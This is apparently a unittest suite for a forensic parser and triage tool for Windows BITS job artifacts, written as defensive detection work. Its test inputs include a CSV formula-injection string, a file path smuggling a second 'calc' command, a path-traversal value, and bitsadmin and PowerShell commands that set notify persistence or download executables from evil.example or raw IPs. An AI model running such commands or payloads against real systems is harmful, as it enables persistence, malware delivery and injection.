"""Test suite for bits_qmgr_parser + bits_gui.

  Unit     - synthetic blobs, every parser primitive, triage rules, CSV safety
  Robust   - fuzzed / truncated / corrupt inputs never crash the pipeline
  Pipeline - analyse() on synthetic folders (nested, corrupt DB, evtx), CLI
  Real     - regression against F:\\bits_qmgr + ground truth from this PC (skipped if absent)
  GUI      - Tk smoke test: load data, filters, both themes, detail panes

Run:  .venv\\Scripts\\python -m unittest -v test_bits_qmgr_parser
"""
import csv, json, os, random, struct, subprocess, sys
import tempfile, unittest, uuid
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import bits_qmgr_parser as P  # noqa: E402

# Real-evidence tests are opt-in and keep your system's identifiers out of the repo:
#   set BITS_EVIDENCE=<exported Downloader folder>   -> generic invariants
#   optional local_expectations.json (git-ignored)   -> exact values (see README)
LOCAL = os.path.join(HERE, "local_expectations.json")
try:
    with open(LOCAL, encoding="utf-8") as _fh:
        EXPECT = json.load(_fh)
except (OSError, ValueError):
    EXPECT = {}
EVIDENCE = os.environ.get("BITS_EVIDENCE") or EXPECT.get("evidence") or ""
HAVE_EVIDENCE = bool(EVIDENCE) and os.path.exists(os.path.join(EVIDENCE, "qmgr.db"))
# exact expectations describe ONE export; never apply them to a different folder
if EXPECT.get("evidence") and EVIDENCE and \
        os.path.normcase(os.path.abspath(EVIDENCE)) != os.path.normcase(os.path.abspath(EXPECT["evidence"])):
    EXPECT = {}


from bits_synth import ustr, ftb, job_blob, file_blob, indx_block, sd_blob, mft_record, mft_image  # noqa: E402


def make_folder(root, nested=True, corrupt_db=False, extra=None):
    d = os.path.join(root, "C", "ProgramData", "Microsoft", "Network", "Downloader") if nested else root
    os.makedirs(d, exist_ok=True)
    fid = str(uuid.uuid4())
    log = b"\x00" * 100 + job_blob(file_ids=[fid]) + b"\xcc" * 33 + \
        job_blob(name="Edge Component Updater", cmd="", errors=0, state=6,
                 creator="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe") + \
        b"\x00" * 7 + file_blob() + \
        file_blob(src="http://msedge.b.tlu.dl.delivery.mp.microsoft.com/x", dest="C:\\t\\x", got=5, total=5)
    with open(os.path.join(d, "edb.log"), "wb") as fh:
        fh.write(log)
    if corrupt_db:
        with open(os.path.join(d, "qmgr.db"), "wb") as fh:
            fh.write(b"\x00" * 4 + b"\xef\xcd\xab\x89" + os.urandom(9000))
    with open(os.path.join(d, "$I30"), "wb") as fh:
        fh.write(indx_block(["qmgr.db", "edb.log"], ["evil_deleted.tmp"]))
    with open(os.path.join(d, "edb.chk"), "wb") as fh:
        fh.write(b"\x00" * 64)
    for k, v in (extra or {}).items():
        with open(os.path.join(d, k), "wb") as fh:
            fh.write(v)
    return d


# ------------------------------------------------------------------ unit
class TestPrimitives(unittest.TestCase):
    def test_filetime_bounds(self):
        self.assertIsNone(P.filetime(0))
        self.assertIsNone(P.filetime(1))
        self.assertIsNone(P.filetime(0xFFFFFFFFFFFFFFFF))
        v = struct.unpack("<Q", ftb(0))[0]
        self.assertEqual(P.filetime(v), "2026-01-01T00:00:00Z")

    def test_reader_truncation_and_limits(self):
        with self.assertRaises(P.ParseError):
            P.Reader(b"\x01\x02").u32()
        with self.assertRaises(P.ParseError):
            P.Reader(struct.pack("<I", 5000) + b"\x00" * 20).ustr()       # too long
        with self.assertRaises(P.ParseError):
            P.Reader(struct.pack("<I", 3) + "ab".encode("utf-16-le")).ustr()   # truncated
        with self.assertRaises(P.ParseError):
            P.Reader(struct.pack("<I", 2) + "ab".encode("utf-16-le")).ustr()   # no NUL
        with self.assertRaises(P.ParseError):
            P.Reader(ustr("a\x01b")).ustr()                                 # control char
        self.assertEqual(P.Reader(struct.pack("<I", 0)).ustr(), "")

    def test_url_host(self):
        self.assertEqual(P.url_host("http://user@Example.COM:8080/x"), "example.com")
        self.assertEqual(P.url_host("http://[::1]:9/x"), "::1")
        self.assertEqual(P.url_host("C:\\x"), "")
        self.assertTrue(P.benign_host("http://msedge.b.tlu.dl.delivery.mp.microsoft.com/a"))
        self.assertFalse(P.benign_host("http://microsoft.com.evil.ru/a"))
        self.assertFalse(P.benign_host("http://evilmicrosoft.com/a"))
        self.assertFalse(P.benign_host("http://microsoft.com@evil.ru/a"))

    def test_csv_safe(self):
        for s in ("=cmd|' /c calc'!A0", "+1", "-2", "@SUM(1)"):
            self.assertTrue(P.csv_safe(s).startswith("'"))
        self.assertEqual(P.csv_safe("Edge"), "Edge")
        self.assertEqual(P.csv_safe(5), 5)


class TestRecords(unittest.TestCase):
    def test_job_fields_with_error(self):
        j, _ = P.parse_job(job_blob())
        self.assertEqual(j["name"], "System update")
        self.assertEqual(j["notify_cmd"], "C:\\Users\\Public\\mail.exe")
        self.assertEqual(j["state"], "error")
        self.assertEqual(j["errors"][0]["hresult"], "0x80072EE7")
        self.assertNotIn("transient_error_count", j)
        self.assertEqual(j["retry_delay_s"], 60)
        self.assertEqual(j["no_progress_timeout_s"], 86400)
        self.assertTrue(j["created"].startswith("2026-01-01"))
        self.assertTrue(j["expiration"].startswith("2026-04-02"))
        self.assertEqual(j["http_method"], "GET")
        self.assertEqual(j["creator_process_inferred"], "C:\\Windows\\System32\\bitsadmin.exe")
        self.assertEqual(j["notify_flags"], "JOB_TRANSFERRED|JOB_ERROR")

    def test_job_without_error_alignment(self):
        j, _ = P.parse_job(job_blob(errors=0, state=6, cmd=""))
        self.assertEqual(j["transient_error_count"], 0)
        self.assertTrue(j["modified"].startswith("2026-01-02"))

    def test_multiple_errors(self):
        j, _ = P.parse_job(job_blob(errors=3))
        self.assertEqual(len(j["errors"]), 3)
        self.assertTrue(j["created"].startswith("2026-01-01"))

    def test_all_job_delimiters(self):
        for d in P.JOB_DELIMS:
            j, _ = P.parse_job(job_blob(delim=d))
            self.assertEqual(j["name"], "System update")

    def test_file_ids_and_enums(self):
        f1, f2 = str(uuid.uuid4()), str(uuid.uuid4())
        j, _ = P.parse_job(job_blob(file_ids=[f1, f2], jtype=1, state=8))
        self.assertEqual(j["file_ids"], [f1, f2])
        self.assertEqual((j["job_type"], j["state"]), ("upload", "cancelled"))

    def test_bad_sid_and_enum_rejected(self):
        with self.assertRaises(P.ParseError):
            P.parse_job(job_blob(sid="garbage"))
        bad = bytearray(job_blob()); struct.pack_into("<I", bad, 24, 99)   # state 99
        with self.assertRaises(P.ParseError):
            P.parse_job(bytes(bad))

    def test_file_sizes(self):
        f, _ = P.parse_file(file_blob(got=10, total=10))
        self.assertTrue(f["complete"])
        f, _ = P.parse_file(file_blob(got=3, total=10))
        self.assertFalse(f["complete"])
        f, _ = P.parse_file(file_blob())
        self.assertIsNone(f["transfer_size"]); self.assertFalse(f["complete"])

    def test_file_bad_source_rejected(self):
        with self.assertRaises(P.ParseError):
            P.parse_file(file_blob(src="not a url"))

    def test_garbage_rejected(self):
        with self.assertRaises(P.ParseError):
            P.parse_job(P.JOB_DELIMS[0] + b"\xff" * 200)
        with self.assertRaises(P.ParseError):
            P.parse_file(P.FILE_DELIM + b"\xff" * 200)


class TestTriage(unittest.TestCase):
    def tri(self, **kw):
        files = kw.pop("files", [])
        j, _ = P.parse_job(job_blob(**kw))
        return " ".join(P.triage(j, files)), P.level_of(P.triage(j, files))

    def test_ryuk_style(self):
        f, _ = P.parse_file(file_blob())
        t, lv = self.tri(files=[f])
        self.assertEqual(lv, "HIGH")
        for needle in ("HIGH: notify command set", "user-writable", "error-loop", "localhost",
                       "generic 'update'", "created by bitsadmin.exe", "executable/script written"):
            self.assertIn(needle, t)

    def test_system32_notify_is_review(self):
        t, lv = self.tri(cmd="C:\\WINDOWS\\system32\\directxdatabaseupdater.exe",
                         name="DirectX_Database_Download", errors=0, state=0,
                         creator="C:\\Windows\\System32\\directxdatabaseupdater.exe")
        self.assertEqual(lv, "REVIEW")

    def test_system32_lolbin_notify_is_high(self):
        _, lv = self.tri(cmd="C:\\Windows\\System32\\cmd.exe", args="cmd.exe /c evil",
                         name="x", errors=0, state=0, creator="C:\\Program Files\\x\\x.exe")
        self.assertEqual(lv, "HIGH")

    def test_upload_flag_and_swapped_fields(self):
        f = {"source_url": "C:\\secret.zip", "dest_file": "http://10.1.2.3/u"}
        t, lv = self.tri(jtype=1, cmd="", errors=0, state=6, name="sync", files=[f])
        self.assertIn("MED: upload job", t)
        self.assertIn("raw IP: http://10.1.2.3/u", t)

    def test_allowlist_bypass_closed(self):
        f = {"source_url": "http://microsoft.com.evil.ru/msedge/update.exe",
             "dest_file": "C:\\Program Files (x86)\\Microsoft\\Edge\\knowledge.exe"}
        t, lv = self.tri(cmd="", errors=0, state=6, name="Edge Component Updater",
                         creator="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                         files=[f])
        self.assertIn("MED: executable/script written", t)
        self.assertNotIn("benign updater noise", t)

    def test_benign_updater_is_info(self):
        f = {"source_url": "http://msedge.b.tlu.dl.delivery.mp.microsoft.com/files/x",
             "dest_file": "C:\\Users\\u\\AppData\\Local\\Temp\\x"}
        t, lv = self.tri(cmd="", errors=0, state=6, name="Edge Component Updater",
                         creator="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                         files=[f])
        self.assertEqual(lv, "INFO"); self.assertIn("benign updater noise", t)

    def test_creator_in_user_path(self):
        t, _ = self.tri(cmd="", errors=0, state=6, name="x",
                        creator="C:\\Users\\bob\\AppData\\Roaming\\x.exe")
        self.assertIn("user-writable path", t)

    def test_unc_and_hresult_hint(self):
        f = {"source_url": "\\\\host\\share\\a.dll", "dest_file": "C:\\x\\a.dll"}
        t, _ = self.tri(cmd="", name="x", creator="", files=[f])
        self.assertIn("SMB/UNC", t)
        self.assertIn("WinINet: server name not resolved", t)


# ------------------------------------------------------------------ robustness
class TestRobustness(unittest.TestCase):
    def test_fuzz_carve_never_raises(self):
        rnd = random.Random(1234)
        good = job_blob() + file_blob()
        for i in range(300):
            buf = bytearray(rnd.randbytes(rnd.randint(0, 3000)))
            for _ in range(rnd.randint(0, 6)):                     # sprinkle delimiters
                pos = rnd.randint(0, max(0, len(buf)))
                buf[pos:pos] = rnd.choice(P.JOB_DELIMS + [P.FILE_DELIM, P.XFER_HDR])
            if i % 10 == 0:                                         # truncated real records
                cut = rnd.randint(1, len(good) - 1); buf += good[:cut]
            P._carve_buf(bytes(buf), "fuzz")

    def test_truncated_records_rejected_not_half_parsed(self):
        good = job_blob()
        for cut in range(20, len(good) - 40, 7):
            try:
                j, _ = P.parse_job(good[:cut])
            except P.ParseError:
                continue
            self.assertTrue("_partial" in j or not j["tail_complete"], cut)

    def test_empty_file_carve(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "empty.log"); open(p, "wb").close()
            self.assertEqual(P.carve(p), ([], []))

    def test_corrupt_db_does_not_abort(self):
        with tempfile.TemporaryDirectory() as d:
            make_folder(d, nested=False, corrupt_db=True)
            r = P.analyse(d)
            self.assertTrue(any("ESE read" in n for n in r["parse_notes"]), r["parse_notes"])
            self.assertGreaterEqual(r["summary"]["unique_jobs"], 2)   # carving still ran


# ------------------------------------------------------------------ i30
class TestI30(unittest.TestCase):
    def test_live_and_slack(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "$I30")
            with open(p, "wb") as fh:
                fh.write(indx_block(["qmgr.db", "edb.log"], ["evil_deleted.tmp"]))
            es = {e["name"]: e for e in P.parse_i30(p)}
        self.assertEqual(set(es), {"qmgr.db", "edb.log", "evil_deleted.tmp"})
        self.assertFalse(es["qmgr.db"]["in_slack"])
        self.assertTrue(es["evil_deleted.tmp"]["in_slack"])
        self.assertTrue(es["edb.log"]["created"].startswith("2026-01-02"))


# ------------------------------------------------------------------ events / live (mocked)
EVT_JSON = json.dumps([
    {"id": 3, "time": "2026-11-26T19:39:43.8658967Z", "record": 1, "message": "created",
     "data": {"jobTitle": "Evil", "jobId": "{AAAAAAAA-0000-0000-0000-000000000001}",
              "jobOwner": "PC\\u", "processPath": "C:\\Windows\\System32\\bitsadmin.exe"}},
    {"id": 6, "time": "2026-11-26T19:39:44Z", "record": 2, "message": "cmd",
     "data": {"jobId": "aaaaaaaa-0000-0000-0000-000000000001", "jobOwner": "PC\\u",
              "program": "C:\\Users\\u\\AppData\\x.exe", "parameters": "x.exe -p"}},
    {"id": 61, "time": "2026-11-26T19:39:45Z", "record": 3, "message": "err",
     "data": {"name": "Evil", "Id": "aaaaaaaa-0000-0000-0000-000000000001",
              "url": "http://127.0.0.1:9/p.exe", "hr": "2147954429"}},
    {"id": 59, "time": "2026-11-26T19:40:00Z", "record": 4, "message": "start",
     "data": {"name": "Known", "Id": "bbbbbbbb-0000-0000-0000-000000000002",
              "url": "http://msedge.b.tlu.dl.delivery.mp.microsoft.com/f"}},
    {"id": 306, "time": "2026-11-26T19:00:00Z", "record": 5, "message": "loaded", "data": {}}])

LIVE_JSON = json.dumps({"job_id": "bbbbbbbb-0000-0000-0000-000000000002", "name": "Known",
                        "job_type": 0, "state": 6, "priority": 2, "owner": "PC\\u",
                        "created": "2026-11-26T19:39:00Z", "modified": "2026-11-26T19:40:01Z",
                        "error_code": None, "notify_cmd": "", "notify_args": "",
                        "files": {"source_url": "http://msedge.b.tlu.dl.delivery.mp.microsoft.com/f",
                                  "dest_file": "C:\\t\\f", "download_size": 5,
                                  "transfer_size": 18446744073709551615}})


class TestEvents(unittest.TestCase):
    def test_normalize(self):
        ev = P.read_events(raw_json=EVT_JSON)
        self.assertEqual(len(ev), 5)
        e61 = [e for e in ev if e["event_id"] == 61][0]
        self.assertEqual(e61["hr"], "0x80072EFD")
        self.assertEqual(e61["job_id"], "aaaaaaaa-0000-0000-0000-000000000001")
        self.assertEqual([e for e in ev if e["event_id"] == 3][0]["job_id"],
                         "aaaaaaaa-0000-0000-0000-000000000001")          # braces stripped
        self.assertEqual(P.read_events(raw_json=""), [])
        self.assertEqual(len(P.read_events(raw_json=json.dumps(json.loads(EVT_JSON)[0]))), 1)

    def test_correlate_event_only_job(self):
        ev = P.read_events(raw_json=EVT_JSON)
        jobs = P.correlate([], ev, "event log only")
        evil = [j for j in jobs if j["name"] == "Evil"][0]
        P.retriage(evil)
        self.assertEqual(evil["status"], "event log only")
        self.assertEqual(evil["creator_process_evt"], "C:\\Windows\\System32\\bitsadmin.exe")
        self.assertEqual(evil["notify_cmd"], "C:\\Users\\u\\AppData\\x.exe")
        self.assertEqual(evil["errors"][0]["hresult"], "0x80072EFD")
        self.assertEqual(evil["level"], "HIGH")
        t = " ".join(evil["triage"])
        for needle in ("notify command set", "user-writable", "localhost", "bitsadmin.exe", "error-loop"):
            self.assertIn(needle, t)

    def test_correlate_enriches_existing_without_overwrite(self):
        j, _ = P.parse_job(job_blob(jid=uuid.UUID("aaaaaaaa-0000-0000-0000-000000000001"),
                                    cmd="C:\\a.exe", errors=0, state=6))
        j["files"], j["source"] = [], ["x"]
        out = P.correlate([j], P.read_events(raw_json=EVT_JSON), "event log only")
        self.assertEqual(out[0]["notify_cmd"], "C:\\a.exe")                 # DB value kept
        self.assertEqual(out[0]["notify_cmd_evt"], "C:\\Users\\u\\AppData\\x.exe")
        self.assertEqual(len(out[0]["events"]), 3)
        self.assertTrue(any(f["source_url"] == "http://127.0.0.1:9/p.exe" for f in out[0]["files"]))

    def test_live_jobs_parsing(self):
        jobs = P.live_jobs(raw_json=LIVE_JSON)                              # single dict form
        self.assertEqual(len(jobs), 1)
        self.assertEqual(jobs[0]["state"], "transferred")
        self.assertIsNone(jobs[0]["files"][0]["transfer_size"])
        self.assertEqual(jobs[0]["level"], "INFO")
        self.assertEqual(P.live_jobs(raw_json=""), [])

    def test_live_snapshot_mocked(self):
        with mock.patch.object(P, "_ps", side_effect=[LIVE_JSON, EVT_JSON]):
            jobs, ev = P.live_snapshot()
        names = {j["name"]: j for j in jobs}
        self.assertEqual(names["Known"]["status"], "live")
        self.assertEqual(len(names["Known"]["events"]), 1)
        self.assertEqual(names["Evil"]["status"], "event log only (live)")

    def test_live_snapshot_event_log_failure(self):
        with mock.patch.object(P, "_ps", side_effect=[LIVE_JSON, RuntimeError("denied")]):
            jobs, ev = P.live_snapshot()
        self.assertEqual(ev, []); self.assertEqual(len(jobs), 1)

    @unittest.skipUnless(os.name == "nt", "Windows PowerShell")
    def test_ps_error_surfaces(self):
        with self.assertRaises(RuntimeError):
            P._ps("throw 'boom'", timeout=60)

    def test_evtx_path_passed_via_env_not_string(self):
        captured = {}

        def fake_run(cmd, **kw):
            captured["cmd"], captured["env"] = cmd, kw["env"]
            return subprocess.CompletedProcess(cmd, 0, "", "")
        with mock.patch("subprocess.run", fake_run):
            P.read_events(path="C:\\x\\a'; calc; '.evtx")
        self.assertNotIn("calc", " ".join(captured["cmd"]))
        self.assertIn("calc", captured["env"]["BITS_EVTX_PATH"])


# ------------------------------------------------------------------ pipeline
class TestPipeline(unittest.TestCase):
    def test_nested_folder_analyse_and_outputs(self):
        with tempfile.TemporaryDirectory() as d:
            make_folder(d, extra={"evil=1.log": job_blob(name="=HYPERLINK(\"x\")")})
            r = P.analyse(d)
            self.assertEqual(r["summary"]["i30_entries"], 3)
            names = {j["name"] for j in r["latest"]}
            self.assertIn("System update", names)
            self.assertIn("Edge Component Updater", names)
            self.assertTrue(all(i["sha256"] and len(i["sha256"]) == 64 for i in r["inventory"]))
            self.assertTrue(any(i["file"].startswith("C" + os.sep) for i in r["inventory"]))
            sysu = [j for j in r["latest"] if j["name"] == "System update"][0]
            self.assertEqual(sysu["status"], "deleted/recovered")
            self.assertEqual(sysu["level"], "HIGH")
            out = os.path.join(d, "out"); P.write_outputs(r, out)
            for fn in ("bits_report.json", "bits_jobs.csv", "bits_files.csv", "i30_entries.csv"):
                self.assertTrue(os.path.getsize(os.path.join(out, fn)) > 0, fn)
            with open(os.path.join(out, "bits_jobs.csv"), encoding="utf-8-sig") as fh:
                rows = list(csv.DictReader(fh))
            for row in rows:
                for v in row.values():
                    self.assertFalse((v or " ")[:1] in "=+@", "formula not neutralised: %r" % v)
            self.assertTrue(any(row["name"].startswith("'=HYPERLINK") for row in rows))
            with open(os.path.join(out, "bits_report.json"), encoding="utf-8") as fh:
                json.load(fh)

    def test_source_name_containing_active_is_not_active(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "inactive_backup.log"), "wb") as fh:
                fh.write(job_blob())
            r = P.analyse(d)
            self.assertEqual(r["summary"]["active_jobs"], 0)
            self.assertEqual(r["latest"][0]["status"], "deleted/recovered")

    def test_dedupe_merges_sources(self):
        jid = uuid.uuid4()
        blob = job_blob(jid=jid)
        with tempfile.TemporaryDirectory() as d:
            for n in ("a.log", "b.log"):
                with open(os.path.join(d, n), "wb") as fh:
                    fh.write(b"\x00" * 10 + blob + b"\x00" * 10 + blob)
            r = P.analyse(d)
        self.assertEqual(len(r["jobs"]), 1)
        self.assertEqual(len(r["jobs"][0]["source"]), 4)

    def test_legacy_queue_noted(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "qmgr0.dat"), "wb") as fh:
                fh.write(b"\x00" * 100)
            r = P.analyse(d)
        self.assertTrue(any("legacy" in n for n in r["parse_notes"]))

    def test_no_carve(self):
        with tempfile.TemporaryDirectory() as d:
            make_folder(d, nested=False)
            self.assertEqual(P.analyse(d, no_carve=True)["summary"]["job_records"], 0)

    def test_evidence_not_modified(self):
        with tempfile.TemporaryDirectory() as d:
            make_folder(d, nested=False)
            before = {f: P.sha256(os.path.join(d, f)) for f in os.listdir(d)}
            P.analyse(d)
            after = {f: P.sha256(os.path.join(d, f)) for f in os.listdir(d)}
        self.assertEqual(before, after)

    def test_cli(self):
        with tempfile.TemporaryDirectory() as d:
            make_folder(d)
            out = os.path.join(d, "o")
            p = subprocess.run([sys.executable, os.path.join(HERE, "bits_qmgr_parser.py"),
                                "-i", d, "-o", out], capture_output=True, text=True, timeout=120)
            self.assertEqual(p.returncode, 0, p.stderr)
            self.assertIn("unique jobs", p.stdout)
            self.assertTrue(os.path.exists(os.path.join(out, "bits_jobs.csv")))


class TestSecurityDescriptor(unittest.TestCase):
    def test_sid_str(self):
        sd = sd_blob(owner="S-1-5-21-1-2-3-1001")
        self.assertEqual(P.sid_str(sd, 20)[0], "S-1-5-21-1-2-3-1001")
        self.assertEqual(P.sid_str(b"\x02" + bytes(20))[0], None)
        self.assertEqual(P.sid_str(b"\x01\x0f" + bytes(10))[0], None)      # truncated

    def test_decode_and_job_integration(self):
        sd = sd_blob(owner="S-1-5-21-1-2-3-1001",
                     aces=(("deny", 0xF003F, "S-1-5-7"), ("allow", 0xF003F, "S-1-5-32-544")))
        d = P.decode_sd(sd)
        self.assertEqual(d["sd_owner_sid"], "S-1-5-21-1-2-3-1001")
        self.assertEqual(d["sd_dacl"], ["deny 0x000F003F S-1-5-7", "allow 0x000F003F S-1-5-32-544"])
        if os.name == "nt":
            self.assertTrue(d["sd_sddl"].startswith("O:S-1-5-21-1-2-3-1001"))
        j, _ = P.parse_job(job_blob(sd=sd, sid="S-1-5-21-1-2-3-1001"))
        self.assertEqual(j["sd_owner_sid"], "S-1-5-21-1-2-3-1001")
        self.assertTrue(j["created"].startswith("2026-01-01"))            # alignment unaffected

    def test_owner_mismatch_flag(self):
        j, _ = P.parse_job(job_blob(sd=sd_blob(owner="S-1-5-18"), sid="S-1-5-21-1-2-3-1001",
                                    cmd="", errors=0, state=6))
        self.assertTrue(any("security-descriptor owner" in t for t in P.triage(j, [])))

    def test_garbage_sd_is_ignored(self):
        self.assertIn("sd_dacl", P.decode_sd(b"\x01\x00" + bytes(18)))
        self.assertEqual(P.decode_sd(b"\x01"), {})
        j, _ = P.parse_job(job_blob(sd=b"\x01" + os.urandom(60)))
        self.assertEqual(j["name"], "System update")


class TestExtraSources(unittest.TestCase):
    def test_command_level(self):
        self.assertEqual(P.command_level("bitsadmin /SetNotifyCmdLine job c:\\x.exe NUL"), "HIGH")
        self.assertEqual(P.command_level("Start-BitsTransfer -Source http://127.0.0.1/a -Destination x"), "HIGH")
        self.assertEqual(P.command_level("bitsadmin /transfer j http://evil.example/a.exe c:\\a.exe"), "MED")
        self.assertEqual(P.command_level("Start-BitsTransfer -Source https://go.microsoft.com/x -Destination y"),
                         "INFO")
        self.assertEqual(P.command_level("Get-BitsTransfer -AllUsers"), "INFO")

    def test_ps_history(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "ConsoleHost_history.txt")
            with open(p, "w", encoding="utf-8") as fh:
                fh.write("dir\nbitsadmin /create evil\nbitsadmin /SetNotifyCmdLine evil c:\\u\\x.exe NUL\n"
                         "Get-BitsTransfer\ncd ..\n")
            out = P.scan_ps_history(p)
        self.assertEqual([c["line_no"] for c in out], [2, 3, 4])
        self.assertEqual(out[1]["level"], "HIGH")
        self.assertEqual(P.scan_ps_history(os.path.join(HERE, "nope.txt")), [])

    def test_4103_command_only_in_contextinfo(self):
        """Regression: 4103 events keep the host command line in ContextInfo, not Payload."""
        own = ("$ErrorActionPreference='Stop' @(Get-BitsTransfer | ForEach-Object { [pscustomobject]@{ "
               "job_id=$_.JobId.ToString(); notify_cmd=$_.NotifyCmdLine[0] } })")
        evs = P.read_events(raw_json=json.dumps([
            {"id": 4103, "time": "2026-11-27T02:23:46Z", "record": 1,
             "channel": "Microsoft-Windows-PowerShell/Operational", "message": "CommandInvocation(Add-Type)",
             "data": {"Payload": 'CommandInvocation(Add-Type): "Add-Type"',
                      "ContextInfo": "Host Application = powershell -NonInteractive -Command " + own}},
            {"id": 4103, "time": "2026-11-27T02:24:00Z", "record": 2,
             "channel": "Microsoft-Windows-PowerShell/Operational", "message": "x",
             "data": {"Payload": "CommandInvocation(Out-Null)",
                      "ContextInfo": "Host Application = powershell -c $j.SetNotifyCmdLine('c:\\u\\x.exe','')"}}]))
        cmds = P.commands_from_events(evs)
        self.assertEqual(len(cmds), 2)
        self.assertEqual((cmds[0]["level"], cmds[0].get("note") is not None), ("INFO", True))  # own query
        self.assertEqual((cmds[1]["level"], cmds[1].get("note")), ("HIGH", None))              # sets notify

    def test_reading_notifycmdline_is_not_high(self):
        self.assertEqual(P.command_level("Get-BitsTransfer | select DisplayName, NotifyCmdLine"), "INFO")
        self.assertEqual(P.command_level("$job.SetNotifyCmdLine('c:\\x.exe', '')"), "HIGH")

    def test_commands_from_ps_events(self):
        evs = P.read_events(raw_json=json.dumps([
            {"id": 4104, "time": "2026-11-27T01:00:00Z", "record": 9, "channel": "Microsoft-Windows-PowerShell/Operational",
             "message": "Creating Scriptblock text", "data": {"ScriptBlockText":
                 "$j = Start-BitsTransfer -Source http://10.0.0.5/p.exe -Destination $env:TEMP\\p.exe -Asynchronous"}},
            {"id": 4104, "time": "2026-11-27T01:00:01Z", "record": 10, "channel": "Microsoft-Windows-PowerShell/Operational",
             "message": "x", "data": {"ScriptBlockText": "Get-ChildItem"}}]))
        cmds = P.commands_from_events(evs)
        self.assertEqual(len(cmds), 1)
        self.assertEqual(cmds[0]["level"], "MED")
        self.assertIn("PowerShell", cmds[0]["kind"])

    def test_delivery_optimization(self):
        raw = json.dumps([{"source_url": "http://1d.tlu.dl.delivery.mp.microsoft.com/f", "caller": "WU Client Download",
                           "size": 10}, {"source_url": "http://203.0.113.9/payload.bin", "caller": "?", "size": 5},
                          {"source_url": None, "caller": "x"}])
        do = P.delivery_optimization(raw_json=raw)
        self.assertEqual([d["level"] for d in do], ["INFO", "MED", "INFO"])
        self.assertEqual(P.delivery_optimization(raw_json=""), [])

    def test_check_files_and_mount_root_containment(self):
        with tempfile.TemporaryDirectory() as d:
            os.makedirs(os.path.join(d, "Users", "Public"))
            with open(os.path.join(d, "Users", "Public", "mail.exe"), "wb") as fh:
                fh.write(b"MZ payload")
            j, _ = P.parse_job(job_blob())
            j["files"] = [{"source_url": "http://127.0.0.1/a.exe", "dest_file": "C:\\Users\\Public\\mail.exe",
                           "tmp_file": "C:\\..\\..\\..\\Windows\\win.ini"}]
            P.check_files([j], d)
            lc = j["files"][0]["local_check"]
            self.assertTrue(lc["exists"]); self.assertEqual(lc["size"], 10)
            self.assertEqual(lc["sha256"], P.sha256(os.path.join(d, "Users", "Public", "mail.exe")))
            self.assertNotIn("tmp_check", j["files"][0])                  # escape attempt refused
            self.assertTrue(any("still on disk" in t for t in j["triage"]))
            self.assertIsNone(P._map_path("http://x/y", d))
            self.assertIsNone(P._map_path("%TEMP%\\x", d))

    def test_mftecmd_csv(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "20261127_MFTECmd_$MFT_Output.csv")
            with open(p, "w", encoding="utf-8-sig", newline="") as fh:
                w = csv.writer(fh)
                w.writerow(["EntryNumber", "SequenceNumber", "InUse", "ParentEntryNumber", "ParentPath",
                            "FileName", "FileSize", "Created0x10", "Created0x30", "LastModified0x10"])
                w.writerow([4242, 3, "False", 99, ".\\Users\\Public", "mail.exe", 10,
                            "2026-01-01 00:00:05", "2026-01-01 00:00:05", "2026-01-01 00:00:06"])
                w.writerow([5, 5, "True", 5, ".", "other.txt", 1, "", "", ""])
            self.assertTrue(P.is_mftecmd_csv(p))
            self.assertFalse(P.is_mftecmd_csv(os.path.join(HERE, "README.md")))
            j, _ = P.parse_job(job_blob())
            j["files"] = [{"source_url": "http://127.0.0.1/a.exe", "dest_file": "C:\\Users\\Public\\mail.exe"}]
            self.assertEqual(P.correlate_mft([j], p), 1)
            m = j["files"][0]["mft"][0]
            self.assertEqual((m["entry"], m["in_use"]), ("4242", False))
            self.assertTrue(any("DELETED" in t for t in j["triage"]))
            # also picked up automatically by analyse()
            make_folder(d, nested=False)
            r = P.analyse(d)
            self.assertTrue(any("$MFT CSV" in n for n in r["parse_notes"]))

    def test_analyse_picks_up_history(self):
        with tempfile.TemporaryDirectory() as d:
            make_folder(d, nested=False, extra={"ConsoleHost_history.txt": b"bitsadmin /create x\n"})
            r = P.analyse(d)
        self.assertEqual(r["summary"]["commands"], 1)
        self.assertEqual(r["commands"][0]["kind"], "PSReadLine history")

    def test_live_extras_never_raises(self):
        with mock.patch.object(P, "_ps", side_effect=RuntimeError("denied")):
            x = P.live_extras()
        self.assertEqual(x["do_downloads"], [])
        self.assertGreaterEqual(len(x["notes"]), 2)

    def test_cli_version_and_bad_input(self):
        import contextlib, io
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(buf):
            with self.assertRaises(SystemExit):
                P.main(["--version"])
            with self.assertRaises(SystemExit) as cm:
                P.main(["-i", os.path.join(HERE, "does_not_exist"), "-o", "x"])
        self.assertEqual(cm.exception.code, 2)
        self.assertIn(P.__version__, buf.getvalue())


class TestSchemaAndPortability(unittest.TestCase):
    def test_every_job_has_full_schema(self):
        """Regression: event-log-only and live jobs used to miss 26 keys (KeyError: 'owner_sid')."""
        with tempfile.TemporaryDirectory() as d:
            make_folder(d, nested=False)
            r = P.analyse(d, events=P.read_events(raw_json=EVT_JSON))
        kinds = {j["status"] for j in r["jobs"]}
        self.assertIn("event log only", kinds)
        self.assertIn("deleted/recovered", kinds)
        for j in r["jobs"] + P.live_jobs(raw_json=LIVE_JSON):
            self.assertEqual(set(P.JOB_SCHEMA) - set(j), set(), (j["status"], j["name"]))
            j["owner_sid"], j["priority"], j["description"]                 # no KeyError
        only = [j for j in r["jobs"] if j["status"] == "event log only"][0]
        self.assertIsNone(only["owner_sid"]); self.assertEqual(only["file_ids"], [])
        with mock.patch.object(P, "_ps", side_effect=[LIVE_JSON, EVT_JSON]):
            jobs, _ = P.live_snapshot()
        for j in jobs:
            self.assertEqual(set(P.JOB_SCHEMA) - set(j), set())

    def test_normalize_does_not_share_mutable_defaults(self):
        a, b = P.normalize_job({}), P.normalize_job({})
        a["errors"].append(1)
        self.assertEqual(b["errors"], [])
